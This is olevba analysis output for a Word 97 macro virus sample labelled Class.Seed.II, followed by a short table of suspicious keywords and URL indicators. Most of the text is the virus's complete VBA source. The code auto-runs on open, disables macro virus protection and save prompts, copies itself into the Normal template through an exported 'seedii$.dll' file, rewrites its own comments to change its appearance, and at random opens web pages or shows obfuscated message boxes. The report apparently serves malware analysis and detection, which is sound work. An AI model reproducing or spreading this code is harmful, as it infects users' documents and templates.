olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.s2-e7974ba29f55047f62f501d8dd3142d47adcbf72
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.s2-e7974ba29f55047f62f501d8dd3142d47adcbf72 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'1260725744891540719504126072574489154071950412607257448915407195041260725744891540719504
Randomize
'9361335736944422225936133573694442222593613357369444222259361335736944422225
x = 0: o = 0
'10583180112420650839616105831801124206508396161058318011242065083961610583180112420650839616
On Error GoTo 93
'16749620316932004136609167496203169320041366091674962031693200413660916749620316932004136609
Options.VirusProtection = False
'2266801248143360565824226680124814336056582422668012481433605658242266801248143360565824
Options.SaveNormalPrompt = False
'4325692828915961542921432569282891596154292143256928289159615429214325692828915961542921
Options.ConfirmConversions = False
'3213952562528189066816321395256252818906681632139525625281890668163213952562528189066816
fx = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'372844572114288855296372844572114288855296372844572114288855296372844572114288855296
xf = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'3194736484110334016319473648411033401631947364841103340163194736484110334016
If xf > 96 And fx > 0 Then GoTo 93
'318129840938479530244318129840938479530244318129840938479530244318129840938479530244
If xf < 96 Then
'4837624291649524051600483762429164952405160048376242916495240516004837624291649524051600
    Set xs = NormalTemplate.VBProject.VBComponents.Item(1)
'2057359922527128725264205735992252712872526420573599225271287252642057359922527128725264
    ActiveDocument.VBProject.VBComponents.Item(1).Name = xs.Name
'7016777166429338208656701677716642933820865670167771664293382086567016777166429338208656
    ActiveDocument.VBProject.VBComponents.Item(1).Export Application.StartupPath & "seedii$.dll"
'13444322222519281544164134443222225192815441641344432222251928154416413444322222519281544164
End If
'568493417617033002769568493417617033002769568493417617033002769568493417617033002769
If fx = 0 Then Set xs = ActiveDocument.VBProject.VBComponents.Item(1)
'15386320051635112388689153863200516351123886891538632005163511238868915386320051635112388689
k = Int(Rnd(1) * 100) + 1
'208513600361988676208513600361988676208513600361988676208513600361988676
If k = 99 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.cannabisculture.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(47) + Chr(83) + Chr(69) + Chr(69) + Chr(68) + Chr(73) + Chr(73)
'1207965633641848140100120796563364184814010012079656336418481401001207965633641848140100
l = Int(Rnd(1) * 75) + 1
'1487135819565962310656148713581956596231065614871358195659623106561487135819565962310656
If l = 74 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.Microsoft.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(47) + Chr(83) + Chr(69) + Chr(69) + Chr(68) + Chr(73) + Chr(73)
'212311126812447577729212311126812447577729212311126812447577729212311126812447577729
m = Int(Rnd(1) * 50) + 1
'4696192384939151349689469619238493915134968946961923849391513496894696192384939151349689
If m = 49 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(80) + Chr(82) + Chr(79) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)
'151681392812028061156151681392812028061156151681392812028061156151681392812028061156
n = Int(Rnd(1) * 25) + 1
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
If n = 24 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(32) + Chr(83) + Chr(69) + Chr(69) + Chr(68) + Chr(32) + Chr(73) + Chr(73)
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
xs.codemodule.AddFromFile Application.StartupPath & "seedii$.dll"
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
With xs.codemodule
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
    For p = 1 To 4
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
    .deletelines 1
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
    Next p
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
End With
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
If xf < 96 Then
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
    With xs.codemodule
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
    .replaceline 1, "Sub AutoClose()"
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
    .replaceline 99, "Sub ToolsMacro()"
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
    End With
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
End If
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
With xs.codemodule
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
    For p = 2 To 44 Step 2
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
    x = Int(Rnd(414835) * 403989) + 8485
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
    o = Int(Rnd(298368) * 235865) + 2988
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
    .replaceline p, "'" & x * x & o * o & x * x & o * o & x * x & o * o & x * x & o * o
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
Next p
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
    For xp = 46 To 98 Step 2
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
    .replaceline xp, "'" & Application.Assistant & Application.DisplayRecentFiles & Application.FocusInMailHeader & Application.Build & Application.StartupPath & Application.ActiveDocument & Application.Version
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
Next xp
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
End With
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
93:
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
If xf > 98 And fx = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
End Sub
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
Sub ViewVBCode()
'Word97/Class.Seed.II by Virus :) Smile!
End Sub




+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.cannabisc|URL                                          |
|          |ulture.com          |                                             |
|IOC       |http://www.Microsoft|URL                                          |
|          |.com                |                                             |
+----------+--------------------+---------------------------------------------+

